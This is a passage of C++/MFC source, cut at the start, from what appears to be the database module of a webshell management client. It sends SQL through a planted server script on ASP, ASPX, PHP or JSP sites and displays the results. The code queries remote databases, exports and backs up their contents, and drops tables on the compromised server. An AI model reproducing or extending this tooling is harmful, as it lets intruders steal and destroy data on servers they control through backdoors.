	}else if (pDlg->nSiteScript ==4)																		//JSP
	{
		posX = pDlg->szSiteConfig.Find("<X>");
		if (posX == -1)
		{
			pDlg->bThreadFinish = true;
			return 0;
		}
		posY = pDlg->szSiteConfig.Find("</X>", posX+1);
		if (posY == -1)
		{
			pDlg->bThreadFinish = true;
			return 0;
		}
		szDataType = pDlg->szSiteConfig.Mid(posX+3, posY-posX-3);
		szDataType = UrlEnCode(pDlg->nSiteCode,  szDataType + szSelectData);
		pDlg->GetExecSql_szSql = "&z2="+ UrlEnCode(pDlg->nSiteCode, pDlg->GetExecSql_szSql);
		bHttpIsOK = MyHttp(pDlg->szSiteUrl, pDlg->szSitePass+ "=Q&z0="+ pDlg->szSiteCode +"&z1="+ szDataType + pDlg->GetExecSql_szSql, pDlg->nSiteCode, temp, szError);

		int nResult = rfind(temp, "Result\t|\t\r\n");
		CString temp2 = temp.Right(nResult);
		if (temp2.Find("Execute Successfully!\t|\t\r\n") == -1)
		{
			//AfxMessageBox(temp);
			//GetDlgItem(IDC_COMBO_SQL)->SetFocus();
			//return;
		}else{
			temp = temp.Mid(0, temp.GetLength()-nResult);
			temp += "\r\n";
		}
		//AfxMessageBox("JSP: "+ pDlg->szSiteConfig );
	}else{
		AfxMessageBox("Type of SiteScript does not recognize.");
		pDlg->GetDlgItem(IDC_COMBO_SQL)->SetFocus();
		pDlg->bThreadFinish = true;
		return 0;
	}

	if (pDlg->m_hWnd == NULL)		//正在执行，如果关闭就崩溃了。
	{
		return 0;
	}
	if (!bHttpIsOK)
	{
		AfxMessageBox( szError );
		pDlg->GetDlgItem(IDC_COMBO_SQL)->SetFocus();
		pDlg->bThreadFinish = true;
		return 0;
	}
	if (temp == "")
	{
		pDlg->bThreadFinish = true;
		return 0;
	}
	if (temp.Left(8) == "ERROR://")
	{
		AfxMessageBox(temp);
		pDlg->GetDlgItem(IDC_COMBO_SQL)->SetFocus();
		pDlg->bThreadFinish = true;
		return 0;
	}

	//设置列表框样式
	posX = 0;
	posY = 0;
	int posZ=0,i=0;
	CString szDataListStyle;
	posZ = temp.Find("\r\n");
	szDataListStyle = temp.Mid(0,posZ);

	pDlg->m_datalist.DeleteAllItems();																//列表内 清空
	pDlg->CtrlListHeaderArr.RemoveAll();
	int nColumnCount = pDlg->m_datalist.GetHeaderCtrl()->GetItemCount();
	for (int ni=0; ni < nColumnCount; ni++)
	{
		pDlg->m_datalist.DeleteColumn(0);																//列表头 清空
	}
	//////////////////////////////////////////////////////////////////////////								//导出到文件，不显示到list
	if (posS1 != -1)
	{
		pDlg->m_datalist.InsertColumn(0, "Result", LVCFMT_LEFT,150);

		CStdioFile pFile;
		if ( pFile.Open(szExportFile, CFile::modeCreate|CFile::modeWrite) == FALSE)
		{
			pDlg->m_datalist.InsertItem(0, "Open save file error");
			pDlg->GetDlgItem(IDC_COMBO_SQL)->SetFocus();
			pDlg->bThreadFinish = true;
			return 0;
		}
		pFile.WriteString(temp);
		pFile.Close();
		pDlg->m_datalist.InsertItem(0, "Export completed.");
		pDlg->GetDlgItem(IDC_COMBO_SQL)->SetFocus();
		pDlg->bThreadFinish = true;
		return 0;
	}
	if (posDataBak1 != -1 && posDataBak2 != -1)																//数据库远程备份
	{
		pDlg->m_datalist.InsertColumn(0, "Result", LVCFMT_LEFT,150);
		if (temp == "1")
		{
			pDlg->m_datalist.InsertItem(0, "OK.");
		}else{
			pDlg->m_datalist.InsertItem(0, "Error.");
		}
		pDlg->GetDlgItem(IDC_COMBO_SQL)->SetFocus();
		pDlg->bThreadFinish = true;
		return 0;
	}
	//////////////////////////////////////////////////////////////////////////
	int nDataListStyle=0;	//有几个字段
	int nDataListStyle_temp=0;
	while(true)
	{
		nDataListStyle_temp = szDataListStyle.Find("\t|\t",nDataListStyle_temp);
		if (nDataListStyle_temp == -1)
		{
			break;
		}
		nDataListStyle_temp = nDataListStyle_temp + 2;
		nDataListStyle++;								//有几个字段
	}

	RECT rect_datalist;
	pDlg->m_datalist.GetWindowRect(&rect_datalist);
	int datalist_width = rect_datalist.right - rect_datalist.left - 20;//控件DATALIST的，宽度。留20给滚动条
	//////////////////////////////////////////////////////////////////////////
	

	while(true)
	{
		posX = szDataListStyle.Find("\t|\t",posY);
		if (posX == -1)
		{
			break;
		}
		pDlg->CtrlListHeaderArr.Add( temp.Mid(posY,posX-posY) );						//保存头部内容，导出Html用到


		if (nDataListStyle * 100 < datalist_width)
		{
			pDlg->m_datalist.InsertColumn(i, temp.Mid(posY,posX-posY), LVCFMT_LEFT, datalist_width/nDataListStyle);
		}else{
			pDlg->m_datalist.InsertColumn(i, temp.Mid(posY,posX-posY), LVCFMT_LEFT, 100);
		}


		//pDlg->m_datalist.InsertColumn(i, temp.Mid(posY,posX-posY), LVCFMT_LEFT,100);
		posY = posX+2;
		i++;
	}
	int ii=0;
	posX = 0;
	posY = posZ+2;
	int m_i=-1;
	while(posZ != -1)
	{
		posZ = temp.Find("\r\n", posY);		//2013.12.23 *	数据库查询结果显示，计算错误的小Bug
		if (posZ == -1)
		{
			break;
		}

		m_i = pDlg->m_datalist.GetItemCount();
		while(ii < i)
		{
			posX = temp.Find("\t|\t",posY);
			if (posX == -1)		//2014.05.17 Bug，编码选择错误，死循环
			{
				break;
			}

			if (ii == 0)
			{
				pDlg->m_datalist.InsertItem(m_i, temp.Mid(posY,posX-posY));
			}else{
				pDlg->m_datalist.SetItemText(m_i, ii, temp.Mid(posY,posX-posY));
			}

			posY = posX+3;

			ii++;
		}
		ii = 0;
		posY = posY+2;
	}
	CString sz_edit;
	sz_edit.Format("Rows: %d", m_i+1);
	m_edit.SetWindowText( sz_edit );					//设置状态栏
	pDlg->GetDlgItem(IDC_COMBO_SQL)->SetFocus();

	pDlg->bThreadFinish = true;
	return 0;
}



void CDataDlg::OnDataGet20Lines()											//获取20条数据
{
	CString temp = "";
	CString szSelect_ht = m_datatree.GetItemText(select_ht);
	if (szSelect_ht == "")
	{
		return;
	}

	HTREEITEM ht1 = m_datatree.GetParentItem(select_ht);
	m_comDatas.SetCurSel( m_comDatas.FindStringExact(0, m_datatree.GetItemText(ht1)) );		//设置现在选择的数据库名


	int posX=0,posY=0;
	if (nSiteScript ==1)		//ASP
	{
		temp = "Select Top 20 * From " + szSelect_ht + " Order By 1";
	}else if (nSiteScript ==2)	//ASPX
	{
		temp = "Select Top 20 * From " + szSelect_ht + " Order By 1";
	}else if (nSiteScript ==3)	//PHP
	{
		posX = szSiteConfig.Find("<T>");
		posY = szSiteConfig.Find("</T>", posX+1);
		if (posX == -1 || posY == -1)
		{
			return;
		}
		CString szDataType = szSiteConfig.Mid(posX+3, posY-posX-3);
		szDataType.MakeUpper();								//转大写比较

		if (szDataType == "INFORMIX")
		{
			temp = "Select first 20 * From " + szSelect_ht + " Order By 1";
		}else if (szDataType == "ORACLE")
		{
			temp = "Select * From " + szSelect_ht + " Where RowNum<=20 Order By 1";
		}else if (szDataType == "MSSQL" || szDataType == "PDO_MSSQL")
		{
			temp = "Select Top 20 * From " + szSelect_ht + " Order By 1";
		}else if (szDataType == "ODBC_MSSQL")
		{
			temp = "Select Top 20 * From " + szSelect_ht + " Order By 1";
		}else if (szDataType == "MYSQL" || szDataType == "PDO_MYSQL")
		{
			temp = "Select * From `" + szSelect_ht + "` Order By 1 Limit 0,20";
		}else if (szDataType == "POSTGRESQL")
		{
			temp = "Select * From " + szSelect_ht + " Order By 1 DESC Limit 20 offset 0";
		}
	}else if (nSiteScript ==4)	//JSP
	{
		posX = szSiteConfig.Find("<X>");
		posY = szSiteConfig.Find("</X>", posX+1);
		if (posX== -1 || posY == -1)
		{
			return;
		}
		CString szDataType = szSiteConfig.Mid(posX+3, posY-posX-3);
		szDataType.MakeUpper();								//转大写比较
		if (szDataType.Find("MYSQL") != -1)
		{
			temp = "Select * From " + szSelect_ht + " Order By 1 Limit 0,20";
		}else if (szDataType.Find("ORACLE") != -1)
		{
			temp = "Select * From " + szSelect_ht + " Where RowNum <= 20 Order By 1";
		}else if (szDataType.Find("MICROSOFT") != -1)
		{
			temp = "Select Top 20 * From " + szSelect_ht + " Order By 1";
		}
	}else{
		return;
	}

	if (bThreadFinish)
	{
		SetDlgItemText(IDC_COMBO_SQL, temp);

		GetExecSql_szSql = temp;
		bThreadFinish = false;
		CreateThread(NULL, 0, GetExecSql, (LPVOID)this, 0, 0);
	}else{
		m_edit.SetWindowText( "Sql Threads busy" );					//设置状态栏
	}

	m_datatree.SetFocus();
}

void CDataDlg::OnDataDropTable()											//删除表
{
	CString temp = "";
	CString szSelect_ht = m_datatree.GetItemText(select_ht);
	if (szSelect_ht == "")
	{
		return;
	}

	HTREEITEM ht1 = m_datatree.GetParentItem(select_ht);
	m_comDatas.SetCurSel( m_comDatas.FindStringExact(0, m_datatree.GetItemText(ht1)) );		//设置现在选择的数据库名

	temp = "DROP TABLE " + szSelect_ht;
	if ( MessageBox( szSelect_ht, "Whether to drop table ?", MB_OKCANCEL) != IDOK)			//询问删除
	{
		return;
	}

	if (bThreadFinish)
	{
		SetDlgItemText(IDC_COMBO_SQL, temp);

		GetExecSql_szSql = temp;
		bThreadFinish = false;
		CreateThread(NULL, 0, GetExecSql, (LPVOID)this, 0, 0);
	}else{
		m_edit.SetWindowText( "Sql Threads busy" );					//设置状态栏
	}

	m_datatree.SetFocus();
}